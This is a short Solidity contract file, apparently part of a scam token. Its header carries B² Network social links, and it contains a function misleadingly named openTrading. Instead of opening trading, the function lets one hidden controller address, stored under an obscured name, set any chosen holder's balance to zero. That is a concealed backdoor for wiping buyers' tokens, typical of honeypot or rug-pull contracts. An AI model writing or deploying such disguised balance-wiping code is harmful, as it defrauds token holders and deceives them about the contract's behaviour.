/*
 * SPDX-License-Identifier: MIT
 * Twitter: https://twitter.com/BsquaredNetwork
 * Website: https://buzz.bsquared.network/?utm_source=icodrops
 * Medium: https://medium.com/@bsquarednetwork
 * Discord: https://discord.com/invite/bsquarednetwork
 */
pragma solidity ^0.8.23;
import "./TestLib.sol";
contract openTradingFacet {
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
